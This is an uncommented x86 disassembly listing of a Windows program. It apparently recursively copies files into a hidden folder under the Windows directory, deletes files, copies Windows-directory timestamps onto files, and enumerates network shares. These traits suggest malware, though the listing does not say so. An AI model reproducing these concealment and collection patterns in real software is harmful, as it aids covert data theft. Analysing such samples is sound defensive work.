add esp 0xc
mov al [ eax + ecx + 0x3 ]
push ecx
mov [ ebp - 0x2 ] al
call [ __import_lookup_table_0(KERNEL32:GetFileAttributesA) ]
cmp bl 0x31
pop ebx
jne r-xdata
and al 0xfe
or al 0x1
jmp r-xdata
and al 0xfd
or al 0x2
jmp r-xdata
cmp [ ebp - 0x1 ] 0x31
jne r-xdata
and al 0xfb
or al 0x4
jmp r-xdata
cmp [ ebp - 0x2 ] 0x31
jne r-xdata
push eax
push [ rw-data ]
call [ __import_lookup_table_0(KERNEL32:SetFileAttributesA) ]
neg eax
sbb al al
and al 0xa
add al 0x45
mov [ rw-data ] al
call sub_403c4e
leave
retn
sub_403908
xor eax eax
push eax
push 0x2
push 0x2
push eax
push eax
push 0x40000000
push [ rw-data ]
call [ __import_lookup_table_0(KERNEL32:CreateFileA) ]
cmp eax 0xffffffff
je r-xdata
mov [ rw-data ] 0x45
push eax
call [ CloseHandle@IAT ]
mov [ rw-data ] 0x4f
jmp r-xdata
jmp sub_403c4e
sub_403943
push ebp
mov ebp esp
sub esp 0x214
push ebx
push esi
push edi
lea eax [ ebp - 0x214 ]
push [ rw-data ]
push [ rw-data ]
push eax
call memcpy
mov esi [ __import_lookup_table_3(MSVCRT:strrchr) ]
push 0x5c
push [ rw-data ]
call esi
push eax
call sub_403b8e
lea eax [ ebp - 0x214 ]
push 0x5c
push eax
call esi
add esp 0x20
test eax eax
je r-xdata
lea eax [ ebp - 0x214 ]
push rw-data
push eax
call strcat
push 0x7d00
mov [ ebp - 0x14 ] 0x42
call [ malloc@IAT ]
mov edi eax
add esp 0xc
test edi edi
je r-xdata
and [ eax + 0x1 ] 0x0
pop edi
pop esi
pop ebx
leave
retn
lea eax [ ebp - 0x214 ]
push eax
call sub_403b22
mov esi eax
pop ecx
cmp esi 0xffffffff
je r-xdata
push edi
call [ free@IAT ]
pop ecx
test esi esi
jne r-xdata
lea eax [ esi + esi * 4 ]
push 0x5
shl eax 0x6
add eax 0x5
mov [ ebp - 0x13 ] eax
lea eax [ ebp - 0x14 ]
push eax
call sub_401ed3
pop ecx
lea eax [ ebp - 0x214 ]
pop ecx
push edi
push eax
call [ __import_lookup_table_0(KERNEL32:FindFirstFileA) ]
cmp eax 0xffffffff
mov [ ebp - 0x4 ] eax
jne r-xdata
push 0x1
pop esi
push edi
call sub_403bdb
test eax eax
pop ecx
je r-xdata
lea eax [ edi + 0x2c ]
push rw-data
push eax
call strcpy
lea eax [ ebp - 0x8 ]
mov ebx 0x140
push eax
push edi
push ebx
push edi
call sub_402635
push ebx
push edi
call sub_401e27
push edi
call [ free@IAT ]
add esp 0x24
jmp r-xdata
and [ ebp - 0x8 ] 0x0
lea ebx [ esi - 0x1 ]
test ebx ebx
jle r-xdata
lea eax [ ebp - 0xc ]
mov ebx 0x140
push eax
push edi
push ebx
push edi
call sub_402635
push ebx
push edi
call sub_401e27
add esp 0x18
test eax eax
je r-xdata
push [ ebp - 0x4 ]
call [ FindClose@IAT ]
push edi
push [ ebp - 0x4 ]
call sub_403ad6
pop ecx
cmp eax 0xffffffff
pop ecx
je r-xdata
push edi
call [ free@IAT ]
pop ecx
push [ ebp - 0x4 ]
call [ FindClose@IAT ]
jmp r-xdata
add [ ebp - 0x8 ] eax
lea esi [ eax + eax * 4 ]
lea eax [ ebp - 0xc ]
shl esi 0x6
push eax
push edi
push esi
push edi
call sub_402635
push esi
push edi
call sub_401e27
add esp 0x18
test eax eax
je r-xdata
cmp [ ebp - 0x8 ] ebx
jl r-xdata
sub_403ad6
push ebx
push esi
mov esi [ __import_lookup_table_0(KERNEL32:FindNextFileA) ]
push edi
mov edi [ esp + 0x14 ]
xor ebx ebx
push edi
push [ esp + 0x14 ]
mov eax ebx
cmp [ rw-data ] 0x0
jne r-xdata
or eax 0xffffffff
jmp r-xdata
push edi
call sub_403bdb
test eax eax
pop ecx
je r-xdata
pop edi
pop esi
pop ebx
retn
cmp ebx 0x64
jge r-xdata
inc ebx
add edi 0x140
push edi
push [ esp + 0x14 ]
jmp r-xdata
call esi
test eax eax
je r-xdata
sub_403b22
push ebp
mov ebp esp
sub esp 0x140
push esi
lea eax [ ebp - 0x140 ]
push edi
push eax
push [ ebp + 0x8 ]
xor edi edi
call [ __import_lookup_table_0(KERNEL32:FindFirstFileA) ]
mov esi eax
cmp esi 0xffffffff
je r-xdata
mov eax edi
lea eax [ ebp - 0x140 ]
push eax
call sub_403bdb
test eax eax
pop ecx
je r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
inc edi
push esi
call [ FindClose@IAT ]
or eax 0xffffffff
jmp r-xdata
lea eax [ ebp - 0x140 ]
push eax
push esi
call [ __import_lookup_table_0(KERNEL32:FindNextFileA) ]
test eax eax
je r-xdata
pop edi
pop esi
leave
retn
push esi
call [ FindClose@IAT ]
jmp r-xdata
sub_403b8e
and [ rw-data ] 0x0
push esi
mov esi [ esp + 0x8 ]
test esi esi
je r-xdata
pop esi
retn
push edi
push edi
call strlen
cmp eax 0x2
pop ecx
jb r-xdata
and [ esi ] 0x0
test esi esi
jne r-xdata
mov eax [ rw-data ]
inc [ rw-data ]
mov [ eax * 4 + rw-data ] edi
lea edi [ esi + 0x1 ]
push 0x3b
push edi
call [ strchr@IAT ]
mov esi eax
pop ecx
test esi esi
pop ecx
je r-xdata
pop edi
sub_403bdb
mov eax [ esp + 0x4 ]
push ebx
push ebp
push esi
test [ eax ] 0x10
push edi
jne r-xdata
push 0x1
pop eax
jmp r-xdata
add eax 0x2c
push 0x2e
push eax
call [ __import_lookup_table_3(MSVCRT:strrchr) ]
xor ebp ebp
pop ecx
cmp [ rw-data ] ebp
pop ecx
mov ebx eax
jle r-xdata
pop edi
pop esi
pop ebp
pop ebx
retn
xor eax eax
mov edi [ lstrcmpiA@IAT ]
mov esi rw-data
test ebx ebx
je r-xdata
push rw-data
push [ esi ]
mov eax [ esi ]
inc eax
inc eax
push eax
lea eax [ ebx + 0x1 ]
push eax
jmp r-xdata
inc ebp
add esi 0x4
cmp ebp [ rw-data ]
jl r-xdata
call edi
test eax eax
je r-xdata
push rw-data
push [ esi ]
call edi
test eax eax
je r-xdata
sub_403c4e
push ebp
mov ebp esp
push ecx
push ecx
mov al [ rw-data ]
push 0x6
mov [ ebp - 0x3 ] al
pop eax
mov [ ebp - 0x7 ] eax
push eax
lea eax [ ebp - 0x8 ]
mov [ ebp - 0x8 ] 0x52
push eax
call sub_401ed3
pop ecx
pop ecx
leave
retn
sub_403c73
push ebp
mov ebp esp
sub esp 0x844
cmp [ rw-data ] 0x0
push ebx
push esi
push edi
jne r-xdata
xor eax eax
jmp r-xdata
push [ ebp + 0x8 ]
mov esi [ __import_lookup_table_3(MSVCRT:sprintf) ]
lea eax [ ebp - 0x844 ]
push rw-data
push eax
call esi
add esp 0xc
lea eax [ ebp - 0x144 ]
push eax
lea eax [ ebp - 0x844 ]
push eax
call [ __import_lookup_table_0(KERNEL32:FindFirstFileA) ]
cmp eax 0xffffffff
mov [ ebp - 0x4 ] eax
je r-xdata
pop edi
pop esi
pop ebx
leave
retn
cmp [ ebp + 0xc ] 0x4c
jne r-xdata
mov edi [ __import_lookup_table_0(KERNEL32:WaitForSingleObject) ]
mov ebx 0x102
push 0x1
pop eax
push [ ebp + 0x8 ]
call [ __import_lookup_table_0(KERNEL32:RemoveDirectoryA) ]
test eax eax
jne r-xdata
push [ ebp - 0x4 ]
call [ FindClose@IAT ]
cmp [ ebp - 0x118 ] 0x2e
je r-xdata
lea eax [ ebp - 0x144 ]
push eax
push [ ebp - 0x4 ]
call [ __import_lookup_table_0(KERNEL32:FindNextFileA) ]
test eax eax
je r-xdata
lea eax [ ebp - 0x118 ]
push eax
lea eax [ ebp - 0x444 ]
push eax
call strcpy
pop ecx
lea eax [ ebp - 0x444 ]
test [ ebp - 0x144 ] 0x10
pop ecx
push eax
push [ ebp + 0x8 ]
push rw-data
je r-xdata
lea eax [ ebp - 0x344 ]
push eax
call esi
add esp 0x10
cmp [ ebp + 0xc ] 0x4c
je r-xdata
lea eax [ ebp - 0x644 ]
push eax
call esi
add esp 0x10
cmp [ ebp + 0xc ] 0x4e
jl r-xdata
lea eax [ ebp - 0x344 ]
push 0x0
push eax
call [ __import_lookup_table_0(KERNEL32:SetFileAttributesA) ]
lea eax [ ebp - 0x344 ]
push eax
call [ DeleteFileA@IAT ]
jmp r-xdata
cmp [ ebp + 0xc ] 0x4d
jle r-xdata
push [ ebp + 0xc ]
lea eax [ ebp - 0x644 ]
push eax
call sub_403c73
pop ecx
test eax eax
pop ecx
je r-xdata
cmp [ ebp + 0xc ] 0x4f
jg r-xdata
cmp [ ebp + 0xc ] 0x4f
jle r-xdata
push [ ebp - 0x4 ]
call [ FindClose@IAT ]
jmp r-xdata
jmp r-xdata
lea eax [ ebp - 0x644 ]
push 0x46
push eax
call sub_404119
pop ecx
test eax eax
pop ecx
je r-xdata
lea eax [ ebp - 0x344 ]
push 0x44
push eax
call sub_404119
pop ecx
test eax eax
pop ecx
je r-xdata
cmp [ ebp + 0xc ] 0x59
jne r-xdata
push 0xea60
push [ rw-data ]
call edi
cmp eax ebx
je r-xdata
push 0xea60
push [ rw-data ]
call edi
cmp eax ebx
je r-xdata
lea eax [ ebp - 0x144 ]
push eax
call sub_403bdb
test eax eax
pop ecx
je r-xdata
lea eax [ ebp - 0x344 ]
push eax
push 0x0
call sub_404161
pop ecx
test eax eax
pop ecx
je r-xdata
lea eax [ ebp - 0x144 ]
push eax
lea eax [ ebp - 0x344 ]
push eax
call sub_404374
pop ecx
pop ecx
jmp r-xdata
push 0xea60
push [ rw-data ]
call edi
cmp eax ebx
je r-xdata
cmp [ ebp + 0xc ] 0x4f
jne r-xdata
sub_403e89
push ebp
mov ebp esp
sub esp 0x200
mov [ rw-data ] 0x4f
call sub_403c4e
lea eax [ ebp - 0x200 ]
push 0x200
push eax
call [ GetWindowsDirectoryA@IAT ]
lea eax [ ebp - 0x200 ]
push rw-data
push eax
call strcat
pop ecx
lea eax [ ebp - 0x200 ]
pop ecx
push 0x0
push eax
call [ __import_lookup_table_0(KERNEL32:CreateDirectoryA) ]
lea eax [ ebp - 0x200 ]
push eax
call [ __import_lookup_table_0(KERNEL32:GetFileAttributesA) ]
or al 0x2
push eax
lea eax [ ebp - 0x200 ]
push eax
call [ __import_lookup_table_0(KERNEL32:SetFileAttributesA) ]
lea eax [ ebp - 0x200 ]
push eax
push [ rw-data ]
call sub_403f05
pop ecx
pop ecx
leave
retn
sub_403f05
push ebp
mov ebp esp
sub esp 0xe54
cmp [ rw-data ] 0x0
push ebx
push esi
push edi
jne r-xdata
xor eax eax
jmp r-xdata
push [ ebp + 0x8 ]
mov esi [ __import_lookup_table_3(MSVCRT:sprintf) ]
lea eax [ ebp - 0xa54 ]
push rw-data
push eax
call esi
add esp 0xc
lea eax [ ebp - 0x154 ]
push eax
lea eax [ ebp - 0xa54 ]
push eax
call [ __import_lookup_table_0(KERNEL32:FindFirstFileA) ]
cmp eax 0xffffffff
mov [ ebp - 0x4 ] eax
je r-xdata
pop edi
pop esi
pop ebx
leave
retn
push 0x1
pop eax
mov edi rw-data
push [ ebp - 0x4 ]
call [ FindClose@IAT ]
cmp [ ebp - 0x128 ] 0x2e
je r-xdata
lea eax [ ebp - 0x154 ]
push eax
push [ ebp - 0x4 ]
call [ __import_lookup_table_0(KERNEL32:FindNextFileA) ]
test eax eax
je r-xdata
lea eax [ ebp - 0x128 ]
push eax
lea eax [ ebp - 0x254 ]
push eax
call strcpy
test [ ebp - 0x154 ] 0x10
pop ecx
pop ecx
je r-xdata
lea eax [ ebp - 0x14 ]
push eax
call [ __import_lookup_table_0(KERNEL32:GetLocalTime) ]
movzx eax [ ebp - 0xa ]
push [ rw-data ]
push eax
movzx eax [ ebp - 0xc ]
push eax
movzx eax [ ebp - 0xe ]
push eax
movzx eax [ ebp - 0x12 ]
push eax
lea eax [ ebp - 0x354 ]
push rw-data
push eax
call esi
mov eax [ rw-data ]
add esp 0x1c
inc [ rw-data ]
cmp eax 0x1869f
jle r-xdata
push [ rw-data ]
lea eax [ ebp - 0x454 ]
push rw-data
push eax
call esi
mov eax [ rw-data ]
add esp 0xc
inc [ rw-data ]
cmp eax 0x1869f
jle r-xdata
lea eax [ ebp - 0x254 ]
push 0x2e
push eax
call [ __import_lookup_table_3(MSVCRT:strrchr) ]
mov ebx eax
lea eax [ ebp - 0x254 ]
push eax
lea eax [ ebp - 0xe54 ]
push [ ebp + 0x8 ]
push edi
push eax
call esi
add esp 0x18
test ebx ebx
jne r-xdata
and [ rw-data ] 0x0
lea eax [ ebp - 0x254 ]
push eax
lea eax [ ebp - 0xc54 ]
push [ ebp + 0x8 ]
push edi
push eax
call esi
lea eax [ ebp - 0x454 ]
push eax
lea eax [ ebp - 0x654 ]
push [ ebp + 0xc ]
push rw-data
push eax
call esi
add esp 0x20
lea eax [ ebp - 0x654 ]
push 0x0
push eax
call [ __import_lookup_table_0(KERNEL32:CreateDirectoryA) ]
lea eax [ ebp - 0x654 ]
push eax
lea eax [ ebp - 0xc54 ]
push eax
call sub_403f05
pop ecx
test eax eax
pop ecx
je r-xdata
and [ rw-data ] 0x0
inc ebx
lea eax [ ebp - 0x354 ]
push ebx
push eax
push [ ebp + 0xc ]
lea eax [ ebp - 0x854 ]
push rw-data
push eax
call esi
add esp 0x14
lea eax [ ebp - 0x354 ]
push eax
lea eax [ ebp - 0x854 ]
push [ ebp + 0xc ]
push edi
push eax
call esi
add esp 0x10
jmp r-xdata
push [ ebp - 0x4 ]
call [ FindClose@IAT ]
jmp r-xdata
lea eax [ ebp - 0x854 ]
push 0x0
push eax
lea eax [ ebp - 0xe54 ]
push eax
call [ CopyFileA@IAT ]
jmp r-xdata
sub_404119
push ebp
mov ebp esp
sub esp 0x400
push esi
push [ ebp + 0x8 ]
call strlen
push [ ebp + 0x8 ]
mov esi eax
mov al [ ebp + 0xc ]
add esi 0x6
mov [ ebp - 0x400 ] al
lea eax [ ebp - 0x3fb ]
push eax
mov [ ebp - 0x3ff ] esi
call strcpy
lea eax [ ebp - 0x400 ]
push esi
push eax
call sub_401ed3
add esp 0x14
pop esi
leave
retn
sub_404161
push ebp
mov ebp esp
mov eax 0x2004
call sub_4057b0
mov eax [ rw-data ]
push ebx
push esi
push edi
push 0x1
cmp eax 0x53
pop edi
mov [ ebp - 0x4 ] edi
je r-xdata
mov [ ebp - 0x2004 ] 0x53
cmp eax 0x59
sete al
dec eax
and al 0xec
add eax 0x59
mov [ ebp - 0x2004 ] al
jmp r-xdata
push ebx
push esi
call [ __import_lookup_table_0(KERNEL32:GetFileSize) ]
push 0x5
pop ecx
sub ecx [ ebp + 0x8 ]
push esi
add eax ecx
mov [ ebp - 0x2003 ] eax
call [ CloseHandle@IAT ]
lea eax [ ebp - 0x2004 ]
push 0x5
push eax
call sub_401ed3
pop ecx
test eax eax
pop ecx
jne r-xdata
cmp [ ebp - 0x2004 ] 0x59
jne r-xdata
xor ebx ebx
push ebx
push 0x80
push 0x3
push ebx
push 0x3
push 0x80000000
push [ ebp + 0xc ]
call [ __import_lookup_table_0(KERNEL32:CreateFileA) ]
mov esi eax
cmp esi 0xffffffff
jne r-xdata
push rw-data
push [ ebp + 0xc ]
call [ __import_lookup_table_3(MSVCRT:fopen) ]
push ebx
mov [ ebp + 0xc ] eax
push [ ebp + 0x8 ]
push eax
call [ __import_lookup_table_3(MSVCRT:fseek) ]
add esp 0x14
cmp [ rw-data ] ebx
jne r-xdata
xor eax eax
jmp r-xdata
mov [ rw-data ] 0x55
call sub_403c4e
jmp r-xdata
push 0x6
pop eax
mov [ ebp - 0x2003 ] eax
push eax
lea eax [ ebp - 0x2004 ]
push eax
call sub_401ed3
pop ecx
mov eax edi
pop ecx
jmp r-xdata
mov [ ebp - 0x4 ] ebx
mov esi 0x2000
pop edi
pop esi
pop ebx
leave
retn
cmp edi esi
jne r-xdata
push [ ebp + 0xc ]
call [ __import_lookup_table_3(MSVCRT:fclose) ]
mov eax [ ebp - 0x4 ]
pop ecx
cmp [ rw-data ] ebx
je r-xdata
push [ ebp + 0xc ]
lea eax [ ebp - 0x2004 ]
push esi
push 0x1
push eax
call [ __import_lookup_table_3(MSVCRT:fread) ]
mov edi eax
lea eax [ ebp + 0x8 ]
push eax
lea eax [ ebp - 0x2004 ]
push eax
lea eax [ ebp - 0x2004 ]
push esi
push eax
call sub_402635
lea eax [ ebp - 0x2004 ]
push edi
push eax
call sub_401e27
add esp 0x28
test eax eax
je r-xdata
sub_4042cd
push 0x46
push [ rw-data ]
call sub_404119
pop ecx
pop ecx
push 0xea60
push [ rw-data ]
call [ __import_lookup_table_0(KERNEL32:WaitForSingleObject) ]
cmp eax 0x102
je r-xdata
retn
push [ esp + 0x4 ]
push [ rw-data ]
call sub_403c73
pop ecx
mov [ rw-data ] 0x47
pop ecx
jmp sub_403c4e
sub_404312
push ebx
push esi
push edi
mov esi rw-data
push 0xff
push esi
call [ GetWindowsDirectoryA@IAT ]
push rw-data
push esi
call strcat
mov edi [ DeleteFileA@IAT ]
pop ecx
pop ecx
push esi
call edi
push 0x5c
push [ rw-data ]
call [ __import_lookup_table_3(MSVCRT:strrchr) ]
mov ebx eax
push ebx
call sub_403b8e
and [ ebx ] 0x0
push 0x59
push [ rw-data ]
call sub_403c73
push esi
push 0x0
call sub_404161
add esp 0x1c
push esi
call edi
pop edi
pop esi
pop ebx
retn
sub_404374
push ebx
push rw-data
push rw-data
call [ __import_lookup_table_3(MSVCRT:fopen) ]
mov ebx eax
pop ecx
test ebx ebx
pop ecx
je r-xdata
pop ebx
retn
push esi
push edi
push ebx
push [ esp + 0x14 ]
call strlen
mov esi [ __import_lookup_table_3(MSVCRT:fwrite) ]
pop ecx
inc eax
push eax
push 0x1
push [ esp + 0x1c ]
call esi
mov edi [ esp + 0x24 ]
push ebx
push 0x8
push 0x1
lea eax [ edi + 0x14 ]
push eax
call esi
push ebx
push 0x4
add edi 0x20
push 0x1
push edi
call esi
push ebx
call [ __import_lookup_table_3(MSVCRT:fclose) ]
add esp 0x34
pop edi
pop esi
sub_4043fe
push ebp
mov ebp esp
sub esp 0x108
push ebx
xor ebx ebx
cmp [ rw-data ] ebx
push esi
push edi
jne r-xdata
mov esi rw-data
push rw-data
push esi
call [ __import_lookup_table_3(MSVCRT:fopen) ]
mov ebx eax
pop ecx
test ebx ebx
pop ecx
jne r-xdata
mov eax [ rw-data ]
mov [ rw-data ] 0x1
add eax 0x4
push eax
call strlen
mov edi eax
pop ecx
cmp edi 0x114
mov [ ebp - 0x8 ] edi
jae r-xdata
mov edi [ rw-data ]
mov eax [ rw-data ]
push eax
call [ __import_lookup_table_3(MSVCRT:fclose) ]
pop ecx
pop edi
pop esi
pop ebx
leave
retn
mov eax [ rw-data ]
mov esi rw-data
add eax 0x4
push eax
push esi
call strcpy
cmp [ rw-data ] 0x56
pop ecx
pop ecx
jne r-xdata
and [ rw-data ] 0x0
mov [ rw-data ] 0x4f
call sub_403c4e
push esi
call sub_40457b
cmp [ rw-data ] 0x56
pop ecx
jne r-xdata
push ebx
push esi
call [ __import_lookup_table_0(KERNEL32:SetFileAttributesA) ]
mov eax [ rw-data ]
cmp [ eax ] ebx
je r-xdata
lea eax [ ebp - 0x108 ]
push 0x100
push eax
call [ GetWindowsDirectoryA@IAT ]
lea eax [ ebp - 0x108 ]
push rw-data
push eax
call strcat
lea eax [ ebp - 0x108 ]
push esi
push eax
call strcat
lea eax [ ebp - 0x108 ]
push eax
push esi
call strcpy
add esp 0x18
push esi
call sub_404ec3
pop ecx
push rw-data
push rw-data
jmp r-xdata
mov [ rw-data ] 0x45
call sub_403c4e
jmp r-xdata
mov eax [ rw-data ]
lea edi [ eax + edi + 0x5 ]
mov eax [ rw-data ]
sub eax [ ebp - 0x8 ]
sub eax 0x5
jmp r-xdata
push esi
call [ __import_lookup_table_3(MSVCRT:fopen) ]
mov ebx eax
pop ecx
test ebx ebx
pop ecx
je r-xdata
lea ecx [ ebp - 0x4 ]
mov [ ebp - 0x4 ] eax
push ecx
push edi
push eax
push edi
call sub_402635
push ebx
push [ ebp - 0x4 ]
push 0x1
push edi
call [ __import_lookup_table_3(MSVCRT:fwrite) ]
push ebx
call [ __import_lookup_table_3(MSVCRT:fclose) ]
add esp 0x24
cmp [ rw-data ] 0x0
je r-xdata
sub_40457b
push ebp
mov ebp esp
sub esp 0x40c
push ebx
push esi
push edi
lea eax [ ebp - 0x40c ]
push 0x400
push eax
call [ GetWindowsDirectoryA@IAT ]
xor edi edi
mov esi [ __import_lookup_table_0(KERNEL32:CreateFileA) ]
push edi
push 0x2000000
push 0x3
push edi
push 0x5
lea eax [ ebp - 0x40c ]
push 0x80000000
push eax
call esi
cmp eax 0xffffffff
mov [ ebp - 0x4 ] eax
je r-xdata
pop edi
pop esi
pop ebx
leave
retn
push edi
push 0x80
push 0x3
push edi
push edi
push 0x40000000
push [ ebp + 0x8 ]
call esi
mov ebx eax
cmp ebx 0xffffffff
jne r-xdata
push edi
lea eax [ ebp - 0xc ]
push edi
push eax
push [ ebp - 0x4 ]
call [ GetFileTime@IAT ]
lea eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0xc ]
push eax
push ebx
call [ SetFileTime@IAT ]
push [ ebp - 0x4 ]
mov esi [ CloseHandle@IAT ]
call esi
push ebx
call esi
push [ ebp + 0x8 ]
call [ __import_lookup_table_0(KERNEL32:GetFileAttributesA) ]
or al 0x2
push eax
push [ ebp + 0x8 ]
call [ __import_lookup_table_0(KERNEL32:SetFileAttributesA) ]
push [ ebp - 0x4 ]
call [ CloseHandle@IAT ]
jmp r-xdata
sub_404632
push ebp
mov ebp esp
sub esp 0x4c0
lea eax [ ebp + 0x8 ]
mov [ ebp - 0x8 ] 0x100
push eax
push 0x20008
push [ ebp + 0x8 ]
mov [ ebp - 0x4 ] 0xc8
call [ OpenProcessToken@IAT ]
test eax eax
jne r-xdata
lea eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x4c0 ]
push 0x3e8
push eax
push 0x1
push [ ebp + 0x8 ]
call [ GetTokenInformation@IAT ]
test eax eax
je r-xdata
xor eax eax
leave
retn
lea eax [ ebp - 0x10 ]
push eax
lea eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0xd8 ]
push eax
lea eax [ ebp - 0x8 ]
push eax
push [ ebp + 0xc ]
push [ ebp - 0x4c0 ]
push 0x0
call [ LookupAccountSidA@IAT ]
neg eax
sbb eax eax
neg eax
leave
retn
sub_4046ae
push ebp
mov ebp esp
mov eax 0x4240
call sub_4057b0
push ebx
push esi
push edi
push 0x2
or [ ebp - 0x14 ] 0xffffffff
pop edi
push rw-data
xor ebx ebx
push [ rw-data ]
mov [ ebp - 0x3c ] edi
mov [ ebp - 0x38 ] ebx
mov [ ebp - 0x34 ] 0x3
mov [ ebp - 0x30 ] edi
mov [ ebp - 0x2c ] ebx
mov [ ebp - 0x28 ] ebx
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x20 ] ebx
mov [ ebp - 0x8 ] ebx
mov [ ebp - 0x10 ] 0x4000
mov [ ebp - 0x4 ] 0x5
mov [ ebp - 0x4240 ] 0x47
call [ __import_lookup_table_3(MSVCRT:strstr) ]
pop ecx
mov esi eax
pop ecx
cmp esi ebx
push 0x5c
je r-xdata
push [ rw-data ]
mov esi [ __import_lookup_table_3(MSVCRT:strrchr) ]
call esi
pop ecx
cmp eax ebx
pop ecx
je r-xdata
lea eax [ esi + 0x3 ]
push eax
call [ strchr@IAT ]
mov edi eax
pop ecx
cmp edi ebx
pop ecx
je r-xdata
mov [ ebp - 0x4 ] 0x6
mov [ ebp - 0x423b ] bl
mov esi [ ebp - 0x4 ]
mov [ eax ] bl
mov ecx [ rw-data ]
cmp eax ecx
je r-xdata
lea eax [ edi + 0x1 ]
push 0x5c
push eax
call [ strchr@IAT ]
pop ecx
test eax eax
pop ecx
je r-xdata
lea eax [ ebp - 0x18 ]
push eax
lea eax [ ebp - 0x3c ]
push eax
push ebx
push ebx
push edi
call WNetOpenEnumA
test eax eax
jne r-xdata
push 0x5c
push ecx
call esi
pop ecx
cmp eax ebx
pop ecx
je r-xdata
inc esi
push 0x2
mov [ edi ] bl
mov [ ebp - 0x28 ] esi
pop edi
jmp r-xdata
inc esi
push esi
push [ rw-data ]
call strcpy
pop ecx
pop ecx
call sub_403943
jmp r-xdata
push [ ebp - 0x10 ]
push 0x40
call [ GlobalAlloc@IAT ]
mov edi eax
mov [ ebp - 0x1c ] edi
cmp [ rw-data ] edi
lea ecx [ eax + 0x1 ]
mov [ ebp - 0x28 ] ecx
jne r-xdata
pop edi
pop esi
pop ebx
leave
retn
push edi
call [ __import_lookup_table_0(KERNEL32:GlobalFree) ]
push [ ebp - 0x18 ]
call WNetCloseEnum
mov esi [ ebp - 0x4 ]
cmp esi 0x5
jne r-xdata
cmp [ ebp - 0x14 ] ebx
mov [ ebp - 0xc ] ebx
jbe r-xdata
cmp eax [ rw-data ]
jne r-xdata
cmp eax [ rw-data ]
jne r-xdata
lea eax [ ebp - 0x40 ]
mov [ ebp - 0x423f ] esi
push eax
lea eax [ ebp - 0x423b ]
push eax
lea eax [ esi - 0x5 ]
push eax
lea eax [ ebp - 0x423b ]
push eax
call sub_402635
lea eax [ ebp - 0x4240 ]
push esi
push eax
call sub_401ed3
add esp 0x18
push [ ebp - 0x10 ]
push ebx
push edi
call memset
add esp 0xc
lea eax [ ebp - 0x10 ]
push eax
lea eax [ ebp - 0x14 ]
push edi
push eax
push [ ebp - 0x18 ]
call WNetEnumResourceA
cmp eax ebx
jne r-xdata
lea esi [ edi + 0x14 ]
mov [ ebp - 0x8 ] 0x1
mov [ ebp - 0x34 ] 0x6
mov [ ebp - 0x30 ] 0x80000002
mov [ ebp - 0x20 ] ecx
jmp r-xdata
inc [ ebp - 0xc ]
add esi 0x20
mov eax [ ebp - 0xc ]
cmp eax [ ebp - 0x14 ]
jb r-xdata
cmp [ esi - 0x10 ] 0x1
jne r-xdata
mov eax [ esi ]
cmp eax ebx
je r-xdata
jmp r-xdata
mov edi [ ebp - 0x4 ]
push [ esi ]
lea eax [ ebp + edi - 0x4240 ]
push eax
call strcpy
push [ esi ]
call strlen
add esp 0xc
add edi eax
cmp [ ebp - 0x8 ] ebx
je r-xdata
add eax 0x2
push 0x5c
push eax
call [ strchr@IAT ]
pop ecx
cmp eax ebx
pop ecx
je r-xdata
mov eax [ esi - 0xc ]
inc edi
mov [ ebp + edi - 0x4240 ] eax
add edi 0x4
mov [ ebp - 0x4 ] edi
mov edi [ ebp - 0x1c ]
lea eax [ ebp - 0x240 ]
push eax
push [ esi ]
call sub_404929
lea eax [ ebp - 0x240 ]
push eax
lea eax [ ebp + edi - 0x4240 ]
push eax
call strcpy
lea eax [ ebp - 0x240 ]
push eax
call strlen
add esp 0x14
add edi eax
inc eax
mov [ esi ] eax
sub_404929
cmp [ rw-data ] 0x1
push [ esp + 0x8 ]
jne r-xdata
push [ esp + 0x8 ]
call sub_404951
mov eax [ esp + 0x8 ]
add eax 0x2
push eax
call sub_404b87
jmp r-xdata
pop ecx
pop ecx
retn
sub_404951
push ebp
mov ebp esp
sub esp 0x448
mov eax [ ebp + 0x8 ]
push ebx
push esi
add eax 0x2
push edi
push eax
call [ gethostbyname@IAT ]
mov esi [ __import_lookup_table_3(MSVCRT:sprintf) ]
test eax eax
je r-xdata
lea eax [ ebp - 0x48 ]
push rw-data
push eax
call strcpy
pop ecx
pop ecx
mov eax [ eax + 0xc ]
mov eax [ eax ]
push [ eax ]
call [ inet_ntoa@IAT ]
push eax
lea eax [ ebp - 0x48 ]
push rw-data
push eax
call esi
add esp 0xc
jmp r-xdata
push rw-data
call [ LoadLibraryA@IAT ]
mov ebx eax
test ebx ebx
jne r-xdata
lea eax [ ebp - 0x48 ]
push rw-data
push eax
call strcpy
pop ecx
pop ecx
cmp [ ebp - 0x48 ] 0x0
jne r-xdata
mov edi [ __import_lookup_table_0(KERNEL32:GetProcAddress) ]
push rw-data
push ebx
call edi
test eax eax
mov [ ebp - 0x8 ] eax
jne r-xdata
push rw-data
push [ ebp + 0xc ]
call esi
pop ecx
pop ecx
jmp r-xdata
push rw-data
push ebx
call edi
mov ebx eax
xor edi edi
cmp ebx edi
je r-xdata
lea eax [ ebp - 0x48 ]
push eax
push rw-data
jmp r-xdata
pop edi
pop esi
pop ebx
leave
retn
lea eax [ ebp - 0x48 ]
push eax
push rw-data
lea eax [ ebp - 0x248 ]
push 0x200
push eax
mov [ ebp - 0x4 ] edi
push [ ebp + 0x8 ]
call strlen
pop ecx
inc eax
push eax
push [ ebp + 0x8 ]
push edi
push edi
call [ MultiByteToWideChar@IAT ]
lea eax [ ebp - 0x248 ]
push eax
lea eax [ ebp - 0x448 ]
push rw-data
push eax
call [ __import_lookup_table_3(MSVCRT:swprintf) ]
add esp 0xc
lea eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x448 ]
push 0x65
push eax
call [ ebp - 0x8 ]
test eax eax
jne r-xdata
push [ ebp + 0xc ]
call esi
add esp 0xc
lea eax [ ebp - 0x48 ]
push eax
push rw-data
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
sub ecx 0x12c
je r-xdata
lea eax [ ebp - 0x48 ]
push eax
push rw-data
push 0x64
pop edx
sub ecx edx
je r-xdata
mov esi [ ebp + 0xc ]
push esi
call strlen
add eax esi
pop ecx
mov [ eax - 0x1 ] 0x53
mov [ eax ] 0x5d
and [ eax + 0x1 ] 0x0
test ah 0x80
je r-xdata
cmp [ eax + 0x8 ] 0x4
lea eax [ ebp - 0x48 ]
push eax
jne r-xdata
